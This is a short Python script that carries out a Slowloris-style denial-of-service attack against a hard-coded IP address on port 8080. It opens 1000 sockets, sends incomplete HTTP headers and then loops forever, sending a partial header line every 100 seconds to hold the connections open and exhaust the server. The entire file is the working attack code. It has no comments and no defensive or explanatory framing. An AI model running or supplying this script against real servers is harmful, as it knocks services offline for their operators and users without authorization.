import socket
import time

target_ip = '212.182.24.27'
target_port = 8080

num_sockets = 1000
sockets = []
for _ in range(num_sockets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sockets.append(sock)

for sock in sockets:
    sock.connect((target_ip, target_port))

headers = "GET / HTTP/1.1\r\nHost: {}\r\n".format(target_ip)
for sock in sockets:
    sock.send(headers.encode())

while True:
    for sock in sockets:
        partial_headers = "X-a: b\r\n"
        sock.send(partial_headers.encode())
    time.sleep(100)